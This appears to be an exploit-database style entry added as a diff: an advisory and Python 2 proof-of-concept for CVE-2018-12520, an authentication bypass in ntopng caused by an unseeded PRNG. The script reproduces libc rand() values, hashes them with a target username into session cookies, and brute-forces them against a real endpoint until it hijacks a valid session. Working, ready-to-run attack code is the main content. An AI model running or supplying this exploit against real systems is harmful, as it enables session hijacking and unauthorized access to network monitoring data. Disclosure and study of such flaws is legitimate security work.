@@ -1,0 +1,49 @@
+'''
+# Vulnerability title: ntop-ng < 3.4.180617 - Authentication Bypass
+# Author: Ioannis Profetis
+# Contact: me at x86.re
+# Vulnerable versions: < 3.4.180617-4560
+# Fixed version: 3.4.180617
+# Link: ntop.org
+# Date: 2.07.2018
+# CVE-2018-12520
+
+# Product Details
+ntopng is the next generation version of the original ntop, a network traffic probe that shows the network usage, similar to what the popular top Unix command does. ntopng is based on libpcap and it has been written in a portable way in order to virtually run on every Unix platform, MacOSX and on Windows as well.
+
+# Vulnerability Details
+An issue was discovered in ntopng 3.4. 
+The PRNG involved in the generation of session IDs is not seeded at program startup. 
+This results in deterministic session IDs being allocated for active user sessions. An attacker with foreknowledge of the operating system and standard library in use by the host running the service and the username of the user whose session they're targeting can abuse the deterministic random number generation in order to hijack the user's session, thus escalating their access.
+
+# Exploit
+A proof-of-concept for this vulnerability can be found below. Note that this script has been tested with Python 2.7, and requires the 'requests' module, which can be found in the Python Package Index.
+'''
+
+import requests
+import sys
+import hashlib
+from ctypes import *
+libc = CDLL('libc.so.6')
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print('[-] Usage: python poc.py <host> <username>')
+        sys.exit(1)
+
+    host, username = sys.argv[1:]
+    for i in range(256):
+        print('[*] Trying with rand() iteration %d...' % i)
+        session = hashlib.md5(('%d' % libc.rand()) + username).hexdigest()
+        r = requests.get(host + '/lua/network_load.lua', cookies={'user': username, 'session': session})
+        if r.status_code == 200:
+            print('[+] Got it! Valid session cookie is %s for username %s.' % (session, username))
+            break
+
+'''
+# Mitigation
+Upgrade to the latest stable version of ntop-ng 3.4.
+
+# Attack Type
+Remote, Unauthenticated, Escalation of Privileges, Information Disclosure
+'''
